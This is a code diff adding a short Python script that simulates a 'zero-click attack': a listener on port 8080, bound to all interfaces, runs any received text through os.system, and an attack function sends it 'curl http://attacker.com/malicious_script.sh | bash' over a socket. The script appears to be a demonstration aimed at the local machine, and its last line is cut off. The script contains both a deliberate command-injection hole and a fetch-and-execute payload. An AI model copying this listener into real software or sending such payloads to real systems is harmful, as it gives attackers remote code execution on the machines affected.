@@ -1,0 +1,43 @@
+import socket
+import os
+import subprocess
+
+# Vulnerable function simulating a service that listens for incoming data
+def vulnerable_service(data):
+    # Simulated vulnerability: executing incoming data as a command
+    os.system(data)
+
+# Create a listener that simulates the vulnerable service
+def start_vulnerable_service():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(("0.0.0.0", 8080))
+    server.listen(5)
+    print("Vulnerable service running on port 8080...")
+    
+    while True:
+        client_socket, addr = server.accept()
+        print(f"Connection from {addr}")
+        data = client_socket.recv(1024).decode()
+        if data:
+            print(f"Received: {data}")
+            vulnerable_service(data)  # Simulated vulnerability
+        client_socket.close()
+
+# Attack function: sending malicious command to the vulnerable service
+def zero_click_attack(target_ip):
+    payload = "curl http://attacker.com/malicious_script.sh | bash"
+    print(f"Sending malicious payload to {target_ip}...")
+    
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((target_ip, 8080))  # Connect to the vulnerable service
+    client.send(payload.encode())  # Send the malicious payload
+    client.close()
+
+# Start the vulnerable service in a separate thread (simulating the victim)
+import threading
+service_thread = threading.Thread(target=start_vulnerable_service)
+service_thread.start()
+
+# Run the zero-click attack on the vulnerable service
+target_ip = "127.0.0.1"  # Attacking the local machine for testing purposes
+zero_click_attack(target_ip
